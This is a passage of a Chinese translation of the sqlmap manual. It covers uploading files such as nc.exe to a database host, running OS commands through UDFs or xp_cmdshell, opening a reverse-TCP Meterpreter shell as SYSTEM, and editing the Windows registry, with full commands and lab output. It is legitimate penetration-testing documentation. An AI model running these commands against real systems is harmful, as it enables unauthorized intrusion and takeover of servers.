<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l output/192.168.136.129/files/C__example.exe</span><br><span class="line">-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe</span><br><span class="line">$ file output/192.168.136.129/files/C__example.exe</span><br><span class="line">output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit</span><br></pre></td></tr></table></figure>

<h3 id="2-上传文件"><a href="#2-上传文件" class="headerlink" title="2.上传文件"></a>2.上传文件</h3><p>参数：–file-write和–file-dest</p>
<p>当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有写文件相关权限时上传文件是可行的。<br>上传的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是MySQL，上传了一个二进制的UPX压缩文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ file /software/nc.exe.packed</span><br><span class="line">/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit</span><br><span class="line">$ ls -l /software/nc.exe.packed</span><br><span class="line">-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed</span><br><span class="line">$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; -\</span><br><span class="line">-file-write &quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003 or 2008</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.0</span><br><span class="line">[...]</span><br><span class="line">do you want confirmation that the file &apos;C:/WINDOWS/Temp/nc.exe&apos; has been success</span><br><span class="line">fully written on the back-end DBMS file system? [Y/n] y</span><br><span class="line">[hh:mm:52] [INFO] retrieved: 31744</span><br><span class="line">[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b</span><br><span class="line">ytes, same size as the local file &apos;/software/nc.exe.packed&apos;</span><br></pre></td></tr></table></figure>

<h2 id="十六、操作系统控制"><a href="#十六、操作系统控制" class="headerlink" title="十六、操作系统控制"></a>十六、操作系统控制</h2><h3 id="1-执行任意操作系统命令"><a href="#1-执行任意操作系统命令" class="headerlink" title="1.执行任意操作系统命令"></a>1.执行任意操作系统命令</h3><p>参数：–os-cmd和–os-shell</p>
<p>若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就能利用SQL注入执行任意的操作系统命令。</p>
<p>当数据库管理系统是MySQL或PostgreSQL时，Sqlmap会通过前面介绍过的文件上传功能上传一个包含用户自定义函数sys_exec()和sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。</p>
<p>当数据库管理系统是微软的SQL Server时，Sqlmap通过存储过程xp_cmdshell来执行任意命令。<br>若xp_cmdshell被禁用（SQL Server &gt;= 2005时默认禁用）Sqlmap会启用它；<br>若xp_cmdshell不存在，Sqlmap会创建它。</p>
<p>当用户想要看到命令执行的标准输出时，Sqlmap使用可列举的注入技术（盲注、带内和基于错误的注入），而当用户不想看到命令执行的标准输出时，堆查询注入技术将被用于执行命令。</p>
<p>下例的目标是PostgreSQL：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --os-cmd id -v 1</code></p>
<p>部分输出如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:12] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">[hh:mm:12] [INFO] testing if current user is DBA</span><br><span class="line">[hh:mm:12] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:12] [INFO] checking if UDF &apos;sys_eval&apos; already exist</span><br><span class="line">[hh:mm:12] [INFO] checking if UDF &apos;sys_exec&apos; already exist</span><br><span class="line">[hh:mm:12] [INFO] creating UDF &apos;sys_eval&apos; from the binary UDF file</span><br><span class="line">[hh:mm:12] [INFO] creating UDF &apos;sys_exec&apos; from the binary UDF file</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">command standard output:</span><br><span class="line">&apos;uid=104(postgres) gid=106(postgres) groups=106(postgres)&apos;</span><br><span class="line">[hh:mm:19] [INFO] cleaning up the database management system</span><br><span class="line">do you want to remove UDF &apos;sys_eval&apos;? [Y/n] y</span><br><span class="line">do you want to remove UDF &apos;sys_exec&apos;? [Y/n] y</span><br><span class="line">[hh:mm:23] [INFO] database management system cleanup finished</span><br><span class="line">[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually</span><br></pre></td></tr></table></figure>

<p>使用参数“–os-shell”可以模拟一个可以执行任意命令的shell，和“–sql-shell”一样这个shell也可以用Tab键补全，支持历史记录。</p>
<p>当堆查询不被支持（如PHP或ASP+Mysql）且数据库管理系统是MySQL时，仍然可以通过SELECT的从句INTO OUTFILE在Web所在主机的可写目录创建一个Web后门，通过这个Web后门来执行命令。Sqlmap支持这一技术并要求用户提供一些用逗号分割的可能是可写目录的路径。Sqlmap支持以下这些服务器端脚本语言：</p>
<ul>
<li>ASP</li>
<li>ASP.NET</li>
<li>JSP</li>
<li>PHP</li>
</ul>
<h3 id="2-带外TCP连接：Meterpreter及相关"><a href="#2-带外TCP连接：Meterpreter及相关" class="headerlink" title="2.带外TCP连接：Meterpreter及相关"></a>2.带外TCP连接：Meterpreter及相关</h3><p>参数：–os-pwn、–os-smbrelay、–os-bof、–priv-esc、–msf-path和–tmp-path</p>
<p>若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就有可能在攻击者的主机和数据库所在主机之间建立带外TCP连接。根据用户的选择，此连接可以是交互式命令shell，Meterpreter会话或图形用户界面（VNC）会话。</p>
<p>Sqlmap要靠Metasploit生成shellcode，在数据库所在主机执行shellcode有以下四种技术：</p>
<p>数据库通过Sqlmap创建的用户自定义函数sys_bineval()在内存中执行Metasploit的shellcode。支持MySQL和PostgreSQL。参数“–os-pwn”。<br>通过Sqlmap自己的用户自定义函数（MySQL和PostgreSQL中的sys_exec()，微软SQL Server中的xp_cmdshell()）上传并执行Metasploit的“stand-alone payload stager”。参数：“–os-pwn”。<br>利用远程代码执行漏洞MS08-068。攻击者的机器要用Metasploit的smb_relay监听来自目标机器的连接。要求在Linux/Unix上以root权限运行Sqlmap且目标DBMS在Windows上以管理员权限运行。参数：“–os-smbrelay”。<br>在微软SQL Server 2000和2005中可通过存储过程sp_replwritetovarbin的堆缓冲区溢出漏洞（MS09-004）在内存中执行Metasploit的shellcode。Sqlmap有自己的数据执行保护绕过技术可以成功利用漏洞，但需要Metasploit生成shellcode以便在成功利用漏洞时执行shellcode。参数：“–os-bof”。<br>下面是以MySQL为目标的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1&quot; --os-pwn --msf-path /software/metasploit</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003</span><br><span class="line">web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0</span><br><span class="line">back-end DBMS: MySQL 5.0</span><br><span class="line">[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS operating system is Windows</span><br><span class="line">how do you want to establish the tunnel?</span><br><span class="line">[1] TCP: Metasploit Framework (default)</span><br><span class="line">[2] ICMP: icmpsh - ICMP tunneling</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:32] [INFO] testing if current user is DBA</span><br><span class="line">[hh:mm:32] [INFO] fetching current user</span><br><span class="line">what is the back-end database management system architecture?</span><br><span class="line">[1] 32-bit (default)</span><br><span class="line">[2] 64-bit</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:33] [INFO] checking if UDF &apos;sys_bineval&apos; already exist</span><br><span class="line">[hh:mm:33] [INFO] checking if UDF &apos;sys_exec&apos; already exist</span><br><span class="line">[hh:mm:33] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:33] [INFO] retrieving MySQL base directory absolute path</span><br><span class="line">[hh:mm:34] [INFO] creating UDF &apos;sys_bineval&apos; from the binary UDF file</span><br><span class="line">[hh:mm:34] [INFO] creating UDF &apos;sys_exec&apos; from the binary UDF file</span><br><span class="line">how do you want to execute the Metasploit shellcode on the back-end database und</span><br><span class="line">erlying operating system?</span><br><span class="line">[1] Via UDF &apos;sys_bineval&apos; (in-memory way, anti-forensics, default)</span><br><span class="line">[2] Stand-alone payload stager (file system way)</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode</span><br><span class="line">which connection type do you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on</span><br><span class="line">all ports</span><br><span class="line">between the specified and 65535</span><br><span class="line">[3] Bind TCP: Listen on the database host for a connection</span><br><span class="line">&gt;</span><br><span class="line">which is the local address? [192.168.136.1]</span><br><span class="line">which local port number do you want to use? [60641]</span><br><span class="line">which payload do you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:40] [INFO] creation in progress ... done</span><br><span class="line">[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..</span><br><span class="line"></span><br><span class="line">=[ metasploit v3.7.0-dev [core:3.7 api:1.0]</span><br><span class="line">+ -- --=[ 674 exploits - 351 auxiliary</span><br><span class="line">+ -- --=[ 217 payloads - 27 encoders - 8 nops</span><br><span class="line">=[ svn r12272 updated 4 days ago (2011.04.07)</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">EXITFUNC =&gt; thread</span><br><span class="line">LPORT =&gt; 60641</span><br><span class="line">LHOST =&gt; 192.168.136.1</span><br><span class="line">[*] Started reverse handler on 192.168.136.1:60641</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF &apos;sys_bineval&apos;, please wait..</span><br><span class="line">[*] Sending stage (749056 bytes) to 192.168.136.129</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 hh:mm:52 +0100 2011</span><br><span class="line">meterpreter &gt; Loading extension espia...success.</span><br><span class="line">meterpreter &gt; Loading extension incognito...success.</span><br><span class="line">meterpreter &gt; [-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter &gt; Loading extension sniffer...success.</span><br><span class="line">meterpreter &gt; System Language : en_US</span><br><span class="line">OS            : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class="line">Computer      : W2K3R2</span><br><span class="line">Architecture  : x86</span><br><span class="line">Meterpreter   : x86/win32</span><br><span class="line">meterpreter &gt; Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address : 127.0.0.1</span><br><span class="line">Netmask    : 255.0.0.0</span><br><span class="line"></span><br><span class="line">Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC: 00:0c:29:fc:79:39</span><br><span class="line">IP Address : 192.168.136.129</span><br><span class="line">Netmask    : 255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt; exit</span><br><span class="line">[*] Meterpreter session 1 closed. Reason: User exit</span><br></pre></td></tr></table></figure>

<p>在Windows中Mysql默认以SYSTEM身份运行，但PostgreSQL无论是在Windows还是在Linux中都以低权限的用户postgres运行。SQL Server 2000默认以SYSTEM身份运行，但SQL Server 2005到2008大多数时间以NETWORK SERVICE身份运行，少数时候以LOCAL SERVICE身份运行。</p>
<p>使用参数“–priv-esc”可以执行Metasploit的getsystem命令以尝试提升权限。</p>
<h2 id="十七、Windows注册表操作"><a href="#十七、Windows注册表操作" class="headerlink" title="十七、Windows注册表操作"></a>十七、Windows注册表操作</h2><p>满足以下条件就可以对Windows注册表进行操作：</p>
<p>目标数据库管理系统是运行在Windows上的<br>目标数据库管理系统是MySQL、PostgreSQL或微软SQL Server<br>支持堆查询<br>目标数据库管理系统当前用户有足够的权限</p>
<h3 id="1-读Windows注册表键值"><a href="#1-读Windows注册表键值" class="headerlink" title="1.读Windows注册表键值"></a>1.读Windows注册表键值</h3><p>参数：–reg-read</p>
<h3 id="2-写Windows注册表键值"><a href="#2-写Windows注册表键值" class="headerlink" title="2.写Windows注册表键值"></a>2.写Windows注册表键值</h3><p>参数：–reg-add</p>
<h3 id="3-删除Windows注册表键值"><a href="#3-删除Windows注册表键值" class="headerlink" title="3.删除Windows注册表键值"></a>3.删除Windows注册表键值</h3><p>参数：–reg-del</p>
<h3 id="4-辅助"><a href="#4-辅助" class="headerlink" title="4.辅助"></a>4.辅助</h3><p>参数：–reg-key、–r-eg-value、–reg-data和–reg-type</p>
<p>适当使用上列参数就可以在命令中添加或修改一个Windows注册表键值而不用在Sqlmap运行时以问答方式提供数据。</p>
<ul>
<li>–reg-key：指定Windows注册表键值的路径</li>
<li>–reg-value：指定Windows注册表键值的键</li>
<li>–reg-data：指定Windows注册表键值的值</li>
<li>–reg-type：指定Windows注册表键值的值的数据类型</li>
</ul>
<p>下面是一个例子：</p>
<p><code>python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1</code></p>
<h2 id="十八、通用选项"><a href="#十八、通用选项" class="headerlink" title="十八、通用选项"></a>十八、通用选项</h2><h3 id="1-从SQLite文件中载入Sqlmap会话"><a href="#1-从SQLite文件中载入Sqlmap会话" class="headerlink" title="1.从SQLite文件中载入Sqlmap会话"></a>1.从SQLite文件中载入Sqlmap会话</h3><p>参数：-s</p>
<p>Sqlmap会自动地为每一个目标创建长久保存的会话SQLite文件，该文件统一存储在特定目录（如：~/.sqlmap/output/）中，其中保存着恢复会话所需的所有数据。若用户想要明确地指定SQLite文件（例如想要将多个目标的数据存储到同一个SQLite文件中），可使用此参数。</p>
<h3 id="2-将HTTP-S-流量记录到日志文件中"><a href="#2-将HTTP-S-流量记录到日志文件中" class="headerlink" title="2.将HTTP(S)流量记录到日志文件中"></a>2.将HTTP(S)流量记录到日志文件中</h3><p>参数：-t</p>
<p>该参数后跟一个文件路径，用于将HTTP(S)请求和响应以文本格式记录到文件中作为日志。这样的日志在调试时是很有用的。</p>
<h3 id="3-非交互模式"><a href="#3-非交互模式" class="headerlink" title="3.非交互模式"></a>3.非交互模式</h3><p>参数：–batch</p>
<p>使用该参数可以让Sqlmap以非交互模式运行，所有要求的输入都会取默认值。</p>
<h3 id="4-设置字符编码"><a href="#4-设置字符编码" class="headerlink" title="4.设置字符编码"></a>4.设置字符编码</h3><p>参数：–charset</p>
<p>为正确解码数据，Sqlmap会使用Web服务器提供的信息（如HTTP头部中字符编码的设置），或是使用第三方库chardet来启发式地确定字符编码。</p>
<p>可以使用参数“–charset”来指定字符编码，如“–charset=GBK”。</p>
<h3 id="5-从目标URL开始爬取目标站点"><a href="#5-从目标URL开始爬取目标站点" class="headerlink" title="5.从目标URL开始爬取目标站点"></a>5.从目标URL开始爬取目标站点</h3><p>参数：–crawl</p>
<p>Sqlmap可以从目标URL开始爬取目标站点并收集可能存在漏洞的URL。使用该参数还需要设置爬取深度，深度是相对于开始爬取的目标URL而言的。只有所有新链接都被递归地访问过后才算爬取结束。建议该参数与“–delay”配合使用。</p>
<p>下例的目标的MySQL：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/&quot; --batch --crawl=3</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:53] [INFO] starting crawler</span><br><span class="line">[xx:xx:53] [INFO] searching for links with depth 1</span><br><span class="line">[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while</span><br><span class="line">[xx:xx:53] [INFO] searching for links with depth 2</span><br><span class="line">[xx:xx:54] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">[xx:xx:00] [INFO] 42/56 links visited (75%)</span><br></pre></td></tr></table></figure>

<p>参数：–crawl-exclude</p>
<p>在此参数后跟一个正则表达式可以排除不想爬取的URL。若URL匹配正则，则不被爬取。如用“–crawl-exclude=logout”来排除所有含有字符串“logout”的URL。</p>
<h3 id="6-设置输出CSV文件中的分隔符"><a href="#6-设置输出CSV文件中的分隔符" class="headerlink" title="6.设置输出CSV文件中的分隔符"></a>6.设置输出CSV文件中的分隔符</h3><p>参数：–csv-del</p>
<p>当数据被输出到CSV文件（–dump-format=CSV）时，默认以“,”分隔，可以使用此参数指定分隔符。如：“–csv-del=”;””。</p>
<h3 id="7-数据库管理系统认证凭据"><a href="#7-数据库管理系统认证凭据" class="headerlink" title="7.数据库管理系统认证凭据"></a>7.数据库管理系统认证凭据</h3><p>参数：–dbms-cred</p>
<p>在某些情况下由于数据库管理系统当前用户权限较低从而导致动作执行失败，此时可以用此参数提供admin用户认证凭据，Sqlmap就会对执行失败的部分特地使用“run as”机制（如：微软SQL Server的OPENROWSET）以admin用户身份重新执行失败的动作。当然，得知道admin用户认证凭据才行。</p>
<h3 id="8-数据输出格式"><a href="#8-数据输出格式" class="headerlink" title="8.数据输出格式"></a>8.数据输出格式</h3><p>参数：–dump-format</p>
<p>Sqlmap对列举的数据有三种不同的输出格式：CSV、HTML和SQLITE。默认为CSV格式，每个数据表都被保存到一个文本文件中，一行是一条记录，以逗号分隔（或是用“–csv-del”指定分隔符）。选择HTML格式，所有数据被保存在一个HTML文件中，数据存放在一个个table中。选择SQLITE格式，所有数据被保存在一个SQLITE文件中，SQLITE中表名和结构会和原表相同。</p>
<h3 id="9-估计完成时间"><a href="#9-估计完成时间" class="headerlink" title="9.估计完成时间"></a>9.估计完成时间</h3><p>参数：–eta</p>
<p>该参数用于显示估计的完成时间。下例是目标为Oracle的布尔型盲注：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot; -b --eta</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:01] [INFO] the back-end DBMS is Oracle</span><br><span class="line">[hh:mm:01] [INFO] fetching banner</span><br><span class="line">[hh:mm:01] [INFO] retrieving the length of query output</span><br><span class="line">[hh:mm:01] [INFO] retrieved: 64</span><br><span class="line">17% [========&gt;                                           ] 11/64</span><br><span class="line"></span><br><span class="line">Then:</span><br><span class="line"></span><br><span class="line">100% [===================================================] 64/64</span><br><span class="line">[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod</span><br><span class="line"></span><br><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: Oracle</span><br><span class="line">banner:</span><br><span class="line">&apos;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&apos;</span><br></pre></td></tr></table></figure>

<p>如你所见，Sqlmap先计算查询输出的长度，然后估计完成时间，最后显示百分比进度条并统计已经接受的数据。</p>
<h3 id="10-刷新会话文件"><a href="#10-刷新会话文件" class="headerlink" title="10.刷新会话文件"></a>10.刷新会话文件</h3><p>参数：–flush-session</p>
<p>使用该参数可以刷新会话文件，以避免Sqlmap默认的缓存机制可能造成的一些问题。使用该参数的前提是真正理解会话文件的概念。另外一个可行的方法是手工删除会话文件。</p>
<h3 id="11-解析和测试表单输入字段"><a href="#11-解析和测试表单输入字段" class="headerlink" title="11.解析和测试表单输入字段"></a>11.解析和测试表单输入字段</h3><p>参数：–forms</p>
<p>除了用“-r”和“–data”来测试表单数据是否存在注入点外，还可以使用参数“–forms”来测试表单数据是否存在注入点。</p>
<p>同时使用参数“–forms”和“-u”，Sqlmap会解析目标URL（“-u”指定的那个URL）返回页面中的表单，测试表单是否有注入点，而不对目标URL进行注入测试。</p>
<h3 id="12-忽略会话文件中的查询结果"><a href="#12-忽略会话文件中的查询结果" class="headerlink" title="12.忽略会话文件中的查询结果"></a>12.忽略会话文件中的查询结果</h3><p>参数：–fresh-queries</p>
<p>使用此参数用于忽略会话文件中的查询结果重新执行查询。</p>
<h3 id="13-对返回结果使用HEX函数"><a href="#13-对返回结果使用HEX函数" class="headerlink" title="13.对返回结果使用HEX函数"></a>13.对返回结果使用HEX函数</h3><p>参数：–hex</p>
<p>非ASCII数据很容易在传输时出错，使用hex函数可以将目标数据库中数据以十六进制返回。</p>
<p>下例的目标是PostgreSQL：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors</code></p>
<p>部分输出如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:14] [INFO] fetching banner</span><br><span class="line">[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR</span><br><span class="line">(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)</span><br><span class="line">[xx:xx:15] [INFO] parsed error message: &apos;pg_query() [&lt;a href=&apos;function.pg-query&apos;&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR: invalid input syntax for type numeric: &quot;:vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:&quot; in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.php&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;&apos;</span><br><span class="line">[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by</span><br><span class="line">GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2</span><br></pre></td></tr></table></figure>

<h3 id="14-指定输出目录路径"><a href="#14-指定输出目录路径" class="headerlink" title="14.指定输出目录路径"></a>14.指定输出目录路径</h3><p>参数：–output-dir</p>
<p>Sqlmap默认将会话文件和结果文件保存到某个子目录output中，可以使用此参数指定输出目录，如：“–output-dir=/tmp”。</p>
<h3 id="15-从响应中解析DBMS的错误信息"><a href="#15-从响应中解析DBMS的错误信息" class="headerlink" title="15.从响应中解析DBMS的错误信息"></a>15.从响应中解析DBMS的错误信息</h3><p>参数：–parse-errors</p>
<p>若是Web应用被配置成Debug模式则很可能在HTTP响应页面中显示SQL错误信息。这些错误信息对于理解某操作失败的原因是很有用的。例如因为权限不足导致的失败错误信息是类似这样的：“Access denied for user ”。</p>
<p>下例的目标是微软SQL Server：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot; --parse-errors</code></p>
<p>部分输出如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the timeneeded to find the right number of query columns. Automatically extending the rangefor current UNION query injection technique test</span><br><span class="line">[xx:xx:17] [INFO] parsed error message: &apos;Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.</span><br><span class="line">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&apos;</span><br><span class="line">[xx:xx:17] [INFO] parsed error message: &apos;Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.</span><br><span class="line">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&apos;</span><br><span class="line">[xx:xx:17] [INFO] parsed error message: &apos;Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.</span><br><span class="line">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&apos;</span><br><span class="line">[xx:xx:17] [INFO] target URL appears to have 3 columns in query</span><br></pre></td></tr></table></figure>

<h3 id="16-指定中轴列"><a href="#16-指定中轴列" class="headerlink" title="16.指定中轴列"></a>16.指定中轴列</h3><p>参数：–pivot-column</p>
<p>有时（如在微软SQL Server、Sybase和SAP MaxDB中）由于缺乏类似机制不可以直接使用偏移m,n的方式列举数据表记录。在这种情况下，Sqlmap通过确定最适合的中轴列（最独特的值）来列举数据，中轴列的值稍后用于检索其他列值。</p>
<p>如果自动选择失败就需要使用该参数手动指定中轴列，如：“–pivot-column=id”。</p>
